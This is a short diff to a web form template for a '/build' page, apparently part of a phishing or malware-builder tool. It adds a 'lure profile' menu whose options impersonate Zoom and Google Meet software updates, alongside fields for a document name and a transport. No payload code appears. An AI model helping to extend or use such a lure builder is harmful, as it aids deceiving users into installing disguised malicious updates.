@@ -16,6 +16,12 @@
   {% if error %}<p class="error">{{ error }}</p>{% endif %}
   <form method="post" action="/build" class="card build">
     <input type="hidden" name="csrf" value="{{ csrf }}">
+    <label>lure profile
+      <select name="profile">
+        <option value="zoom">Zoom (zoom-update)</option>
+        <option value="meet">Google Meet (google-meet-update)</option>
+      </select>
+    </label>
     <label>document name<input type="text" name="doc_name" value="{{ defaults.document_name }}"></label>
     <label>transport
       <select name="transport">
